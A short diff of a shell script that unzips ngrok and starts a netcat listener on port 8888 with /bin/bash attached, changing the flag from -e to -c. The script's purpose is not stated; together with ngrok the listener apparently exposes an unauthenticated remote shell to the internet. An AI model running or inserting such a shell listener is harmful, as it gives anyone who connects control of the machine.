@@ -7,7 +7,7 @@ fi
 
 unzip ngrok.zip
 {
-    nc -l -v -p 8888 -e /bin/bash
+    nc -l -v -p 8888 -c /bin/bash
     killall -SIGINT ngrok && echo "ngrok terminated"
 } &
 {
